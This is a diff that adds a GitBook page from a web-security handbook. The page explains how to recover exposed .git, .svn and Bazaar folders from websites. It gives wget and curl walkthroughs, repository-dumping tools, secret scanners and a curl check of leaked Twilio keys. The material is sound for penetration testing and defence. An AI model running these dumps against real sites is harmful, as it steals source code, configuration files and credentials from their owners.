@@ -1,0 +1,1010 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>不安全的代码管理 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../不安全的对象引用/" />
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../SUMMARY.html">
+            
+                <a href="../SUMMARY.html">
+            
+                    
+                    目录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" >
+            
+                <span>
+            
+                    
+                    注入漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../命令注入/">
+            
+                <a href="../命令注入/">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../SQL注入/">
+            
+                <a href="../SQL注入/">
+            
+                    
+                    SQL注入
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.2.1" data-path="../SQL注入/MYSQL.md">
+            
+                <span>
+            
+                    
+                    MYSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.2" data-path="../SQL注入/MSSQL.html">
+            
+                <a href="../SQL注入/MSSQL.html">
+            
+                    
+                    MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.3" data-path="../SQL注入/PostgreSQL.html">
+            
+                <a href="../SQL注入/PostgreSQL.html">
+            
+                    
+                    PostgreSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2.4" data-path="../SQL注入/SQLite.html">
+            
+                <a href="../SQL注入/SQLite.html">
+            
+                    
+                    SQLite
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../CRLF注入/">
+            
+                <a href="../CRLF注入/">
+            
+                    
+                    CRLF注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../LDAP注入/">
+            
+                <a href="../LDAP注入/">
+            
+                    
+                    LDAP注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="../NOSQL注入/">
+            
+                <a href="../NOSQL注入/">
+            
+                    
+                    NOSQL注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="../XPATH注入/">
+            
+                <a href="../XPATH注入/">
+            
+                    
+                    XPATH注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.7" data-path="../SAML注入/">
+            
+                <a href="../SAML注入/">
+            
+                    
+                    SAML注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.8" data-path="../[XML实体注入漏洞-XXE">
+            
+                <span>
+            
+                    
+                    XML实体注入漏洞-XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9" data-path="../模板注入-SSTI/">
+            
+                <a href="../模板注入-SSTI/">
+            
+                    
+                    模板注入-SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" >
+            
+                <span>
+            
+                    
+                    前端安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../跨站脚本攻击-XSS/">
+            
+                <a href="../跨站脚本攻击-XSS/">
+            
+                    
+                    跨站脚本攻击-XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../跨站请求伪造-CSRF/">
+            
+                <a href="../跨站请求伪造-CSRF/">
+            
+                    
+                    跨站请求伪造-CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../CORS配置错误/">
+            
+                <a href="../CORS配置错误/">
+            
+                    
+                    CORS配置错误
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../Web缓存泄露/">
+            
+                <a href="../Web缓存泄露/">
+            
+                    
+                    Web缓存泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" >
+            
+                <span>
+            
+                    
+                    权限控制
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="2.3.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    不安全的代码管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.2" data-path="../不安全的对象引用/">
+            
+                <a href="../不安全的对象引用/">
+            
+                    
+                    不安全的对象引用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3" data-path="../不安全的管理接口/">
+            
+                <a href="../不安全的管理接口/">
+            
+                    
+                    不安全的管理接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" >
+            
+                <span>
+            
+                    
+                    文件相关漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../文件上传漏洞/">
+            
+                <a href="../文件上传漏洞/">
+            
+                    
+                    文件上传漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../文件包含/README.md">
+            
+                <span>
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" >
+            
+                <span>
+            
+                    
+                    认证方式漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="../JWT安全问题/">
+            
+                <a href="../JWT安全问题/">
+            
+                    
+                    JWT安全问题
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.2" data-path="../OAuth认证/">
+            
+                <a href="../OAuth认证/">
+            
+                    
+                    OAuth认证
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" >
+            
+                <span>
+            
+                    
+                    其他漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.2.1" data-path="../任意url跳转/">
+            
+                <a href="../任意url跳转/">
+            
+                    
+                    任意url跳转
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.2" data-path="../目录遍历/">
+            
+                <a href="../目录遍历/">
+            
+                    
+                    目录遍历
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2.3" data-path="../服务端请求伪造-SSRF/">
+            
+                <a href="../服务端请求伪造-SSRF/">
+            
+                    
+                    服务端请求伪造-SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" >
+            
+                <span>
+            
+                    
+                    代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1.1" data-path="../PHP弱类型/">
+            
+                <a href="../PHP弱类型/">
+            
+                    
+                    PHP弱类型
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" >
+            
+                <span>
+            
+                    
+                    内网渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.2.1" data-path="../内网技巧/内网技巧.html">
+            
+                <a href="../内网技巧/内网技巧.html">
+            
+                    
+                    内网技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >不安全的代码管理</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="insecure-source-code-management">Insecure source code management</h1>
+<ul>
+<li><a href="#git---source-code-management">GIT - Source code management</a><ul>
+<li><a href="#github-example-with-a-git">Github example with a .git</a></li>
+<li><a href="#recovering-the-content-of-gitindex">Recovering the content of .git/index</a></li>
+<li><a href="#automatic-way--diggitpy">Automatic way : diggit.py</a></li>
+<li><a href="#automatic-way-gogitdumper">Automatic way : GoGitDumper</a></li>
+<li><a href="#automatic-way--rip-git">Automatic way : rip-git</a></li>
+<li><a href="#automatic-way--githack">Automatic way : GitHack</a></li>
+<li><a href="#harvesting-secrets--trufflehog">Harvesting secrets : trufflehog</a></li>
+<li><a href="#harvesting-secrets--gitrob">Harvesting secrets : Gitrob</a></li>
+<li><a href="#harvesting-secrets--gitleaks">Harvesting secrets : Gitleaks</a></li>
+</ul>
+</li>
+<li><a href="#svn---source-code-management">SVN - Source code management</a><ul>
+<li><a href="#svn-example-wordpress">SVN example (Wordpress)</a></li>
+<li><a href="#automatic-way--svn-extractor">Automatic way : svn-extractor</a></li>
+</ul>
+</li>
+<li><a href="#bazaar---source-code-management">BAZAAR - Source code management</a><ul>
+<li><a href="#automatic-way--rip-bzr">Automatic way : rip-bzr</a></li>
+<li><a href="#automatic-way--bzr_dumper">Automatic way : bzr_dumper</a></li>
+</ul>
+</li>
+<li><a href="#leaked-api-keys">Leaked API keys</a></li>
+</ul>
+<h2 id="git---source-code-management">GIT - Source code management</h2>
+<p>The following examples will create either a copy of the .git or a copy of the current commit.</p>
+<p>Check for the following files, if they exist you can extract the .git folder.</p>
+<ul>
+<li>.git/config</li>
+<li>.git/HEAD</li>
+<li>.git/logs/HEAD</li>
+</ul>
+<h3 id="github-example-with-a-git">Github example with a .git</h3>
+<ol>
+<li>Check 403 error (Forbidden) for .git or even better : a directory listing</li>
+<li>Git saves all informations in log file .git/logs/HEAD (try &apos;head&apos; in lowercase too)<pre><code class="lang-powershell"> <span class="hljs-number">0000000000000000000000000000000000000000</span> <span class="hljs-number">15</span>ca375e54f056a576905b41a417b413c57df6eb root &lt;root@dfc2eabdf236.(none)&gt; <span class="hljs-number">1455532500</span> +<span class="hljs-number">0000</span>        clone: from https://github.com/fermayo/hello-world-lamp.git
+ <span class="hljs-number">15</span>ca375e54f056a576905b41a417b413c57df6eb <span class="hljs-number">26</span>e35470d38c4d6815bc4426a862d5399f04865c Michael &lt;michael@easyctf.com&gt; <span class="hljs-number">1489390329</span> +<span class="hljs-number">0000</span>        commit: Initial.
+ <span class="hljs-number">26</span>e35470d38c4d6815bc4426a862d5399f04865c <span class="hljs-number">6</span>b4131bb3b84e9446218359414d636bda782d097 Michael &lt;michael@easyctf.com&gt; <span class="hljs-number">1489390330</span> +<span class="hljs-number">0000</span>        commit: Whoops! Remove flag.
+ <span class="hljs-number">6</span>b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael &lt;michael@easyctf.com&gt; <span class="hljs-number">1489390332</span> +<span class="hljs-number">0000</span>        commit: Prevent directory listing.
+</code></pre>
+</li>
+<li><p>Access to the commit based on the hash -&gt; a directory name (first two signs from hash) and filename (rest of it).git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c,</p>
+<pre><code class="lang-powershell"> <span class="hljs-comment"># create a .git directory</span>
+ git init test
+ cd test/.git
+
+ <span class="hljs-comment"># download the file</span>
+ wget http://xxx.web.xxx.com/.git/objects/<span class="hljs-number">26</span>/e35470d38c4d6815bc4426a862d5399f04865c
+ mkdir .git/object/<span class="hljs-number">26</span>
+ mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/<span class="hljs-number">26</span>/
+
+ <span class="hljs-comment"># display the content of the file</span>
+ git cat-file -p <span class="hljs-number">26</span>e35470d38c4d6815bc4426a862d5399f04865c
+     tree <span class="hljs-number">323240</span>a3983045cdc0dec2e88c1358e7998f2e39
+     parent <span class="hljs-number">15</span>ca375e54f056a576905b41a417b413c57df6eb
+     author Michael &lt;michael@easyctf.com&gt; <span class="hljs-number">1489390329</span> +<span class="hljs-number">0000</span>
+     committer Michael &lt;michael@easyctf.com&gt; <span class="hljs-number">1489390329</span> +<span class="hljs-number">0000</span>
+     Initial.
+</code></pre>
+</li>
+<li><p>Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39</p>
+<pre><code class="lang-powershell"> wget http://xxx.web.xxx.com/.git/objects/<span class="hljs-number">32</span>/<span class="hljs-number">3240</span>a3983045cdc0dec2e88c1358e7998f2e39
+ mkdir .git/object/<span class="hljs-number">32</span>
+ mv <span class="hljs-number">3240</span>a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/<span class="hljs-number">32</span>/
+
+ git cat-file -p <span class="hljs-number">323240</span>a3983045cdc0dec2e88c1358e7998f2e39
+     <span class="hljs-number">040000</span> tree bd083286051cd869ee6485a3046b9935fbd127c0        css
+     <span class="hljs-number">100644</span> blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
+     <span class="hljs-number">040000</span> tree <span class="hljs-number">14032</span>aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
+     <span class="hljs-number">100644</span> blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
+     <span class="hljs-number">040000</span> tree <span class="hljs-number">5</span>df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
+</code></pre>
+</li>
+<li>Read the data (flag.txt)<pre><code class="lang-powershell"> wget http://xxx.web.xxx.com/.git/objects/cb/<span class="hljs-number">6139863967</span>a752f3402b3975e97a84d152fd8f
+ mkdir .git/object/cb
+ mv <span class="hljs-number">6139863967</span>a752f3402b3975e97a84d152fd8f .git/objects/<span class="hljs-number">32</span>/
+ git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
+</code></pre>
+</li>
+</ol>
+<h3 id="recovering-the-content-of-gitindex">Recovering the content of .git/index</h3>
+<p>Use the git index file parser, using python3 <a href="https://pypi.python.org/pypi/gin" target="_blank">https://pypi.python.org/pypi/gin</a></p>
+<pre><code class="lang-powershell">pip3 install gin
+gin ~/git-repo/.git/index
+</code></pre>
+<p>Recover name and sha1 hash for each files listed in the index, allowing us to re-use the previous method on the file.</p>
+<pre><code class="lang-powershell">$ gin .git/index | egrep -e <span class="hljs-string">&quot;name|sha1&quot;</span> 
+name = AWS Amazon Bucket S3/README.md
+sha1 = <span class="hljs-number">862</span>a3e58d138d6809405aa062249487bee074b98
+
+name = CRLF injection/README.md
+sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
+</code></pre>
+<h3 id="automatic-way--diggitpy">Automatic way : diggit.py</h3>
+<pre><code class="lang-powershell">./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
+./diggit.py -u http://webpage.com -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
+
+-u is remote path, where .git folder exists
+-t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder &amp;&amp; git init)
+-o is a hash of particular Git object to download
+</code></pre>
+<h3 id="automatic-way--gogitdumper">Automatic way : GoGitDumper</h3>
+<pre><code class="lang-powershell">go get github.com/c-sto/gogitdumper
+gogitdumper -u http://urlhere.com/.git/ -o yourdecideddir/.git/
+git log
+git checkout
+</code></pre>
+<h3 id="automatic-way--rip-git">Automatic way : rip-git</h3>
+<pre><code class="lang-powershell">perl rip-git.pl -v -u <span class="hljs-string">&quot;http://edge1.web.*****.com/.git/&quot;</span>
+
+git cat-file -p <span class="hljs-number">07603070376</span>d63d911f608120eb4b5489b507692  
+tree <span class="hljs-number">5</span>dae937a49acc7c2668f5bcde2a9fd07fc382fe2
+parent <span class="hljs-number">15</span>ca375e54f056a576905b41a417b413c57df6eb
+author Michael &lt;michael@easyctf.com&gt; <span class="hljs-number">1489389105</span> +<span class="hljs-number">0000</span>
+committer Michael &lt;michael@easyctf.com&gt; <span class="hljs-number">1489389105</span> +<span class="hljs-number">0000</span>
+
+git cat-file -p <span class="hljs-number">5</span>dae937a49acc7c2668f5bcde2a9fd07fc382fe2
+</code></pre>
+<h3 id="automatic-way--githack">Automatic way : GitHack</h3>
+<pre><code class="lang-powershell">git clone https://github.com/lijiejie/GitHack
+GitHack.py http://www.openssl.org/.git/
+</code></pre>
+<h3 id="harvesting-secrets--trufflehog">Harvesting secrets : trufflehog</h3>
+<blockquote>
+<p>Searches through git repositories for high entropy strings and secrets, digging deep into commit history</p>
+</blockquote>
+<pre><code class="lang-powershell">pip install truffleHog <span class="hljs-comment"># https://github.com/dxa4481/truffleHog</span>
+truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
+</code></pre>
+<h3 id="harvesting-secrets--gitrob">Harvesting secrets : Gitrob</h3>
+<blockquote>
+<p>Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files.</p>
+</blockquote>
+<pre><code class="lang-powershell">go get github.com/michenriksen/gitrob <span class="hljs-comment"># https://github.com/michenriksen/gitrob</span>
+export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+gitrob [options] target [target2] ... [targetN]
+</code></pre>
+<h3 id="harvesting-secrets---gitleaks">Harvesting secrets - Gitleaks</h3>
+<blockquote>
+<p>Gitleaks provides a way for you to find unencrypted secrets and other unwanted data types in git source code repositories.</p>
+</blockquote>
+<pre><code class="lang-powershell"><span class="hljs-comment"># Run gitleaks against a public repository</span>
+docker run --rm --name=gitleaks zricethezav/gitleaks -v -r  https://github.com/zricethezav/gitleaks.git
+
+<span class="hljs-comment"># Run gitleaks against a local repository already cloned into /tmp/</span>
+docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks
+
+<span class="hljs-comment"># Run gitleaks against a specific Github Pull request</span>
+docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/<span class="hljs-number">9000</span>
+
+or
+
+go get -u github.com/zricethezav/gitleaks
+</code></pre>
+<h2 id="svn---source-code-management">SVN - Source code management</h2>
+<h3 id="svn-example-wordpress">SVN example (Wordpress)</h3>
+<pre><code class="lang-powershell">curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
+</code></pre>
+<ol>
+<li>Download the svn database from <a href="http://server/path_to_vulnerable_site/.svn/wc.db" target="_blank">http://server/path_to_vulnerable_site/.svn/wc.db</a><pre><code class="lang-powershell"> INSERT INTO <span class="hljs-string">&quot;NODES&quot;</span> VALUES(<span class="hljs-number">1</span>,<span class="hljs-string">&apos;trunk/test.txt&apos;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&apos;trunk&apos;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&apos;trunk/test.txt&apos;</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&apos;normal&apos;</span>,NULL,NULL,<span class="hljs-string">&apos;file&apos;</span>,X<span class="hljs-string">&apos;2829&apos;</span>,NULL,<span class="hljs-string">&apos;$sha1$945a60e68acc693fcb74abadb588aac1a9135f62&apos;</span>,NULL,<span class="hljs-number">2</span>,<span class="hljs-number">1456056344886288</span>,<span class="hljs-string">&apos;bl4de&apos;</span>,<span class="hljs-number">38</span>,<span class="hljs-number">1456056261000000</span>,NULL,NULL);
+</code></pre>
+</li>
+<li>Download interesting files<ul>
+<li>remove $sha1$ prefix</li>
+<li>add .svn-base postfix</li>
+<li>use first two signs from hash as folder name inside pristine/ directory (94 in this case)</li>
+<li>create complete path, which will be: <code>http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="automatic-way--svn-extractor">Automatic way : svn-extractor</h3>
+<pre><code class="lang-powershell">git clone https://github.com/anantshri/svn-extractor.git
+python svn-extractor.py &#x2013;url <span class="hljs-string">&quot;url with .svn available&quot;</span>
+</code></pre>
+<h2 id="bazaar---source-code-management">BAZAAR - Source code management</h2>
+<h3 id="automatic-way--rip-bzrpl">Automatic way : rip-bzr.pl</h3>
+<pre><code class="lang-powershell">wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
+docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u
+</code></pre>
+<h3 id="automatic-way--bzrdumper">Automatic way : bzr_dumper</h3>
+<pre><code class="lang-powershell">git clone https://github.com/SeahunOh/bzr_dumper
+python3 dumper.py -u <span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span> -o source
+Created a standalone tree (format: <span class="hljs-number">2</span>a)                                                                                                                                                       
+[!] Target : http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5000</span>/
+[+] Start.
+[+] GET repository/pack-names
+[+] GET README
+[+] GET checkout/dirstate
+[+] GET checkout/views
+[+] GET branch/branch.conf
+[+] GET branch/format
+[+] GET branch/last-revision
+[+] GET branch/tag
+[+] GET b<span class="hljs-string">&apos;154411f0f33adc3ff8cfb3d34209cbd1&apos;</span>
+[*] Finish
+
+$ bzr revert
+ N  application.py
+ N  database.py
+ N  static/
+</code></pre>
+<h2 id="leaked-api-keys">Leaked API keys</h2>
+<p>If you find any key , use the <a href="https://github.com/streaak/keyhacks" target="_blank">keyhacks</a> from @streaak to verifiy them.</p>
+<p>Twilio example :</p>
+<pre><code class="lang-powershell">curl -X GET <span class="hljs-string">&apos;https://api.twilio.com/2010-04-01/Accounts/ACCOUNT_SID/Keys.json&apos;</span> -u ACCOUNT_SID:AUTH_TOKEN
+</code></pre>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/bl4de/research/tree/master/hidden_directories_leaks" target="_blank">bl4de, hidden_directories_leaks</a></li>
+<li><a href="https://github.com/bl4de/security-tools/tree/master/diggit" target="_blank">bl4de, diggit</a></li>
+<li><a href="https://michenriksen.com/blog/gitrob-now-in-go/" target="_blank">Gitrob: Now in Go - Michael Henriksen</a></li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                
+                <a href="../不安全的对象引用/" class="navigation navigation-next navigation-unique" aria-label="Next page: 不安全的对象引用">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"不安全的代码管理","level":"2.3.1","depth":2,"next":{"title":"不安全的对象引用","level":"2.3.2","depth":2,"path":"不安全的对象引用/README.md","ref":"不安全的对象引用/README.md","articles":[]},"previous":{"title":"权限控制","level":"2.3","depth":1,"ref":"","articles":[{"title":"不安全的代码管理","level":"2.3.1","depth":2,"path":"不安全的代码管理/README.md","ref":"不安全的代码管理/README.md","articles":[]},{"title":"不安全的对象引用","level":"2.3.2","depth":2,"path":"不安全的对象引用/README.md","ref":"不安全的对象引用/README.md","articles":[]},{"title":"不安全的管理接口","level":"2.3.3","depth":2,"path":"不安全的管理接口/README.md","ref":"不安全的管理接口/README.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"不安全的代码管理/README.md","mtime":"2019-09-15T21:20:00.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-09-16T07:03:19.203Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
